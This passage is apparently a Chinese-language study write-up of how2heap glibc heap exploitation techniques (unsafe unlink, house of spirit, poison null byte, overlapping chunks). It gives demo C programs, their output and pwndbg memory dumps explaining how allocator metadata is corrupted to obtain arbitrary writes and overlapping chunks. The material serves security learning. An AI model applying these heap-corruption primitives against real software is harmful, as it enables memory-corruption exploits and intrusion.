        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

* 利用chunk0的堆溢出，修改chunk1_ptr

```
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if allocated            | |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     | |M|P|
      chunk0_ptr-> -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                      fake prev size 0x0 	    	     		|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        
        |                      fake size 0x0                         |P |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               
        .               fake fd: &chunk0_ptr - 24                        .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 
        .               fake bk: &chunk0_ptr - 16                       .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        .                        unuse space                            .
        .                                                               .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                        0x80                                   |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             0x145 & ~1 = 0x144                          | | |P|
      chunk1_ptr->-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
        |             0x0                                               |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             0x0                                                
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

* 释放chunk1,这时候检测到fake chunk的状态为 `unuse`， 将触发unlink

触发unlink之前：

```
pwndbg> p chunk0_ptr
$34 = (uint64_t *) 0x603010
pwndbg> p &chunk0_ptr
$35 = (uint64_t **) 0x602070 <chunk0_ptr>
```

触发unlink之后，由于

```
FD = P->fd;
BK = P->bk;
FD->bk = BK
BK->fd = FD
```

chunk0_ptr的值将被覆盖为chunk0_ptr - 0x18

```
pwndbg> p chunk0_ptr
$37 = (uint64_t *) 0x602058
pwndbg> p &chunk0_ptr
$40 = (uint64_t **) 0x602070 <chunk0_ptr>
```

* 创建字符串 victim_string，并赋值`Hello ~`

* 这时候，向chunk0中填充数据，也就相当于向  `0x602058`中填充数据

  `chunk0_ptr[3] = (uint64_t) victim_string`

  此时`0x602070`的值将被覆盖为 victim_string的地址

```
pwndbg> p &victim_string
$38 = (char (*)[8]) 0x7fffffffdd40
pwndbg> p chunk0_ptr
$39 = (uint64_t *) 0x7fffffffdd40
```

* `chunk0_ptr[0] = 0x4141414142424242LL;`
  `fprintf(stderr, "New Value: %s\n",victim_string);`

  这时候，修改chunk0，也就相当于修改victim_string

**漏洞成因:**

1. **为了节约内存，被使用之后的chunk和未使用的chunk的内存布局不相同，但是都用了相同的大小，于是free chunk具有更多的数据。 **
2. **glibc的堆空间控制是用链表处理的，其中除了fastbin（bin可以认为是链表的头结点指针，用来标志不同的链表），都使用了双向链表的结构，即使用fd和bk指针指向前者和后者，这恰巧是free chunk才有的额外数据。** 
3. **在分配或是合并的时候需要删除链表中的一个结点，大概是P->fd->bk = P->bk; P->bk->fd = P->fd;,而在做这个操作之前会有一个简单的检查，即查看P->fd->bk == P && P->bk->fd= == P,但是这个检查有个致命的弱点，就是因为他查找fd和bk都是通过相对位置去查找的，那么虽然P->fd和P->bk都不合法，但是P->fd->bk和P->bk->fd合法就可以通过这个检测，而在删除结点的时候就会造成不同的效果了**
# house_of_spirit

通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size

	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
	fake_chunks[9] = 0x1234; // nextsize

	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

结果:

```
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7fffb45ee0a8 and the second at 0x7fffb45ee0d8.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffb45ee0a8.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7fffb45ee0a8, which will be 0x7fffb45ee0b0!
malloc(0x30): 0x7fffb45ee0b0
```

**目的: 通过伪造fake chunk,在下一次申请chunk时，返回fake chunk的地址。这样当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的**

流程:

* 申请一个1byte的chunk
* 申请一个指针 `unsigned long long *a;`

* 申请一个数组 `unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));`并设置变量fake_chunks 16字节对齐，也就是首地址最后一位是 0。
* 伪造两个区块

```
fake_chunks[1] = 0x40;       // first size

fake_chunks[9] = 0x1234;     // next size

-----------------------------
|         0x0               |	 <=========== first fake chunk prev_size
-----------------------------	
|         0x40              |     <========== fake_chunk[1]   => first fake chunk size
-----------------------------
|         0x0               |     <========== a
-----------------------------
|         0x0               |
-----------------------------
|         0x0               |
-----------------------------
|         0x0               |
-----------------------------
|         0x0               |
-----------------------------
|         0x0               |
-----------------------------
|         0x0               |      <=========== second fake chunk prev_size
-----------------------------
|         0x1234            |      <========== fake_chunk[9] => second fake chunk size
-----------------------------
|         0x0               |
-----------------------------
```

* `a = &fake_chunks[2];`
* 释放区块a, free(a)

```
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x7fffffffdcf0 ◂— 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

* 再次申请0x30大小的chunk，即可返回栈地址: `0x7fffffffdd00`

# poison_null_byte

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>


int main()
{
	fprintf(stderr, "Welcome to poison null byte 2.0!\n");
	fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n");
	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;
	void *barrier;

	fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	fprintf(stderr, "a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x200);

	fprintf(stderr, "b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	fprintf(stderr, "c: %p\n", c);

	barrier =  malloc(0x100);
	fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	
	*(size_t*)(b + 0x1f0) = 0x200;
	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n");
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);

	b1 = malloc(0x100);

	fprintf(stderr, "b1: %p\n",b1);
	fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
	fprintf(stderr, "We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control

	b2 = malloc(0x80);
	fprintf(stderr, "b2: %p\n",b2);

	memset(b2,'B',0x80);
	fprintf(stderr, "Current b2 content:\n%s\n",b2);

	fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1);
	free(c);
	
	fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	fprintf(stderr, "d: %p\n",d);
	
	fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	fprintf(stderr, "New b2 content:\n%s\n",b2);

	fprintf(stderr, "Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
		"for the clear explanation of this technique.\n");
}
```

测试失败， ubuntu14.04和ubuntu16.04。

参考glibc_2.26中的写法，在`free(b)`之前，添加`*(size_t*)(b + 0x1f0) = 0x200;`即可。

```
Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0x603010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0x603120
c: 0x603330
We allocate a barrier at 0x603440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
b1: 0x603120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0x603230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0x603120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.
```

* 定义变量，并初始化

```
uint8_t* a;
uint8_t* b;
uint8_t* c;
uint8_t* b1;
uint8_t* b2;
uint8_t* d;
void *barrier;

a = (uint8_t*) malloc(0x100);
b = (uint8_t*) malloc(0x200);
c = (uint8_t*) malloc(0x100);
barrier =  malloc(0x100);
```

barrier用于保证free(c)的时候，c chunk不会因为consolidate和top chunk合并。

* 针对b chunk做预处理，然后释放 b

```
uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	
*(size_t*)(b + 0x1f0) = 0x200;

free(b);
```

* 假设 a chunk存在 off_by_one

```
a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
```

当前 b chunk的size为`0x210 | prev_in_use = 0x211`，经过off_by_one，b chunk的size将变为 0x200.所以在b chunk预处理的时候，需要将`*(size_t*)(b + 0x1f0) = 0x200;`

* 申请两个新的chunk, b1和b2，并初始化b2

```
uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
b1 = malloc(0x100);
b2 = malloc(0x80);
memset(b2,'B',0x80);
```

此时b1和b2都是b chunk的一部分

* 释放b1和b2

```
free(b1);
free(c);
```

先 free b1，这个时候 chunk c 会认为 b1 就是 chunk b。当我们 free chunk c 的时候，chunk c会和chunk b1合并。由于 chunk c 认为 chunk b1 依旧是 chunk b。因此会把中间的 chunk b2 吞并。

* 再申请一个0x300大小的chunk

```
d = malloc(0x300);
```

这时候，b2 将指向d中的某一部分。

# overlapping_chunks

简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){
	intptr_t *p1,*p2,*p3,*p4;

	p1 = malloc(0x100 - 8);
	p2 = malloc(0x100 - 8);
	p3 = malloc(0x80 - 8);

	memset(p1, '1', 0x100 - 8);
	memset(p2, '2', 0x100 - 8);
	memset(p3, '3', 0x80 - 8);

	free(p2);

	int evil_chunk_size = 0x181;
	int evil_region_size = 0x180 - 8;

	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
	p4 = malloc(evil_region_size);

	memset(p4, '4', evil_region_size);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);
}
```

结果如下:

```
qianfa@qianfa:~/Desktop/how2heap/glibc_2.25$ ./overlapping_chunks

This is a simple chunks overlapping problem

Let's start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x2586010
p2=0x2586110
p3=0x2586210

Now let's free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us
a region size of 376

Now let's allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x2586110 and ends at 0x2586288
p3 starts at 0x2586210 and ends at 0x2586288
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.

Let's run through an example. Right now, we have:
p4 = xř
p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4, '4', 376), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3, '3', 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444�
```

分析:

* 分配3个堆块,并初始化堆块的内容

```
p1 = malloc(0x100 - 8);
p2 = malloc(0x100 - 8);
p3 = malloc(0x80 - 8);
memset(p1, '1', 0x100 - 8);
memset(p2, '2', 0x100 - 8);
memset(p3, '3', 0x80 - 8);
```

* 释放第二个区块,`free(p2)`,且p2处于unsorted bins中

```
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 257, 
  fd = 0x3131313131313131, 
  bk = 0x3131313131313131, 
  fd_nextsize = 0x3131313131313131, 
  bk_nextsize = 0x3131313131313131
}
0x603100 PREV_INUSE {
  prev_size = 3544668469065756977, 
  size = 257,  //0x100
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
0x603200 {
  prev_size = 256, 
  size = 128,    // 0x80
  fd = 0x3333333333333333, 
  bk = 0x3333333333333333, 
  fd_nextsize = 0x3333333333333333, 
  bk_nextsize = 0x3333333333333333
}
```

* 通过某些方法，比如p1的溢出，修改释放后的p2的 size 为 0x180

```
int evil_chunk_size = 0x181;
int evil_region_size = 0x180 - 8;
*(p2-1) = evil_chunk_size;
```

```
0x603000 PREV_INUSE {                                    // p1
  prev_size = 0, 
  size = 257, 
  fd = 0x3131313131313131, 
  bk = 0x3131313131313131, 
  fd_nextsize = 0x3131313131313131, 
  bk_nextsize = 0x3131313131313131
}
0x603100 PREV_INUSE {                                      // p2
  prev_size = 3544668469065756977, 
  size = 385, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
0x603280 PREV_INUSE {                                          // top_chunk
  prev_size = 3689348814741910323, 
  size = 134529, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

```

* 申请0x180大小的p4, `p4 = malloc(evil_region_size);`

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty

0x603000 PREV_INUSE {                       
  prev_size = 0, 
  size = 257, 
  fd = 0x3131313131313131, 
  bk = 0x3131313131313131, 
  fd_nextsize = 0x3131313131313131, 
  bk_nextsize = 0x3131313131313131
}
0x603100 PREV_INUSE {
  prev_size = 3544668469065756977, 
  size = 385, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x3232323232323232, 
  bk_nextsize = 0x3232323232323232
}
0x603280 PREV_INUSE {
  prev_size = 3689348814741910323, 
  size = 134529, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

此时, 

p4    ------------> 0x603100   ------- 0x603280, 大小0x180

p3    ------------> 0x603200   ------- 0x603280，大小0x80

# overlapping_chunks_2

同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){
  
  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);
  
  free(p4);

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 

  free(p2);
  
  fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr, "\nData inside chunk p3: \n\n");
  fprintf(stderr, "%s\n",(char *)p3); 

  fprintf(stderr, "\nLet's write something inside p6\n");
  memset(p6,'F',1500);  
  
  fprintf(stderr, "\nData inside chunk p3: \n\n");
  fprintf(stderr, "%s\n",(char *)p3); 
}
```

结果：

```

This is a simple chunks overlapping problem
This is also referenced as Nonadjacent Free Chunk Consolidation Attack

Let's start to allocate 5 chunks on the heap:

chunk p1 from 0x21c3010 to 0x21c33f8
chunk p2 from 0x21c3400 to 0x21c37e8
chunk p3 from 0x21c37f0 to 0x21c3bd8
chunk p4 from 0x21c3be0 to 0x21c3fc8
chunk p5 from 0x21c3fd0 to 0x21c43b8

Let's free the chunk p4.
In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4

Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2
with the size of chunk_p2 + size of chunk_p3

Now during the free() operation on p2, the allocator is fooled to think that 
the nextchunk is p4 ( since p2 + size_p2 now point to p4 ) 

This operation will basically create a big free chunk that wrongly includes p3

Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunk

Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and 
we can overwrite data in p3 by writing on chunk p6

chunk p6 from 0x21c3400 to 0x21c3bd8
chunk p3 from 0x21c37f0 to 0x21c3bd8

Data inside chunk p3: 

CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�

Let's write something inside p6

Data inside chunk p3: 

FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�
```

分析：

